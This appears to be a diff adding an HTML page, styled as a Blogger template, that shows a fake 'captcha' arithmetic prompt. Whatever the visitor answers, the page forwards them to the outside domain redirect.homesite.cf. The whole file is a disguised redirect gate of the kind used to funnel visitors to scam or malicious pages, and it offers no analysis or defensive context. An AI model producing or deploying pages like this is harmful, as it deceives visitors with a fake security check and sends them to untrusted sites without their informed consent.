@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html class='ltr' dir='ltr' lang='en_gb' translate='no' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
+<meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no' name='viewport'/>
+<meta content='notranslate' name='google'/>
+<meta content='text/html; charset=UTF-8' http-equiv='Content-Type'/>
+<meta content='#000000' name='theme-color'/>
+<meta content='#000000' name='apple-mobile-web-app-status-bar-style'/>
+<meta content='#000000' name='msapplication-navbutton-color'/>
+<head>
+<title>Solve the captcha to continue</title>
+<style>
+html, body { background-color: #000000!important; }
+</style>
+</head>
+<body>
+<script> window.onload = setTimeout(function tt() { function ask() {
+var a = Math.floor(Math.random() * 10) + 1;
+var b = Math.floor(Math.random() * 10) + 1;
+var op = ["+", "+", "+", "+"][Math.floor(Math.random()*4)];
+if(navigator.userAgent.match(/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/)) { return prompt("\n✦ Solve the captcha to continue ➤\n" + "✦ How much is " + a + " " + op + " " + b + " " + "=" + " ?") == eval( a + op + b); } else if (navigator.userAgent.match(/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i)) { return prompt("\n✦ Solve the captcha to continue ➤\n" + "✦ How much is " + a + " " + op + " " + b + " " + "=" + " ?") == eval( a + op + b); } else { if(navigator.userAgent.match(/firefox|fxios/i)){ return prompt("✦ Solve the captcha to continue ➤\n" + "✦ How much is " + a + " " + op + " " + b + " " + "=" + " ?\n\n") == eval( a + op + b); } else { return prompt("\n✦ Solve the captcha to continue ➤\n" + "✦ How much is " + a + " " + op + " " + b + " " + "=" + " ?\n") == eval( a + op + b); } }
+}
+var questions = [ask()],
+total = questions.length,
+correct = questions.filter(Boolean).length;
+if (correct >= '1') { location.assign('https://redirect.homesite.cf'); } else { location.assign('https://redirect.homesite.cf/demo4.html'); } }, 100);
+</script>
+</body>
+</html>
